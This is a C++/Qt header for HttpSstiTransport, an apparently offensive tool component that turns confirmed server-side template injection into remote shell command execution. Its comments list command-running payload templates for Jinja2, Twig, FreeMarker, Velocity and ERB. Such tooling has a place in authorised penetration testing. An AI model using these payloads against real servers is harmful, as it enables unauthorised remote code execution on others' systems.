#ifndef HTTPSSTITRANSPORT_H
#define HTTPSSTITRANSPORT_H

#include "HttpWebshellTransport.h"

// HttpSstiTransport - server-side template injection payload wrapper on
// top of HttpWebshellTransport.
//
// The operator has confirmed injection into a template engine (a Flask
// endpoint that renders `render_template_string(request.args['name'])`,
// a Twig template exposed via a search box, ...) and now wants to run
// arbitrary commands. The command is substituted into a per-engine
// payload template before hitting the wire.
//
// Ships with a preset library covering:
//   jinja2     Python:  {{ ...os.popen('{CMD}').read() }}
//   twig       PHP:     {{ ['{CMD}']|filter('system') }}
//   freemarker Java:    <#assign x="...Execute"?new()>${x("{CMD}")}
//   velocity   Java:    #set($x=$class.inspect("java.lang.Runtime")...)
//   erb        Ruby:    <%= %x[{CMD}] %>
//   custom     use payloadTemplate as-is
//
// The {CMD} placeholder is substituted with cmdEscape applied:
//   shell    single-quote-safe shell escaping (default)
//   python   Python-quoted, safe inside a python string literal
//   none     verbatim (caller's responsibility)
class HttpSstiTransport : public HttpWebshellTransport {
    Q_OBJECT
public:
    struct SstiConfig : public HttpWebshellTransport::Config {
        QString engine = QStringLiteral("jinja2");   // See preset list above
        QString payloadTemplate;                     // Populated from preset if empty
        QString cmdEscape = QStringLiteral("shell");
    };

    explicit HttpSstiTransport(const SstiConfig &cfg, QObject *parent = nullptr);

    QString kind() const override { return QStringLiteral("http_ssti"); }

    // Lookup helpers so the UI can populate previews.
    static QString payloadForEngine(const QString &engine);
    static QStringList knownEngines();

protected:
    QString transformCommand(const QString &command) const override;

private:
    SstiConfig m_ssti;
};

#endif  // HTTPSSTITRANSPORT_H
